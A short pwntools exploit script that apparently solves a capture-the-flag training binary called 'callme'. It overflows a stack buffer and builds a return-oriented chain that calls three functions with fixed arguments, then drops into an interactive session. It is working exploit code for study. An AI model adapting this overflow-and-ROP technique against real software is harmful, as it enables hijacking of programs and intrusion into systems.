from pwn import *
elf = context.binary = ELF('./callme',checksec=False)
p = process()

offset = 40

def call_me(x):
    return flat(
        0x000000000040093c, #pop rdi; pop rsi; pop rdx; ret;
        0xdeadbeefdeadbeef, # arg1
        0xcafebabecafebabe, # arg2
        0xd00df00dd00df00d, # arg3
        x)

payload = flat(
        b'A'*offset,
        call_me(0x00400720), # callme_one
        call_me(0x00400740), # callme_two
        call_me(0x004006f0), # callme_three
)

p.recvuntil(b"> ")
write("payload.txt",payload)
p.sendline(payload)
p.interactive()
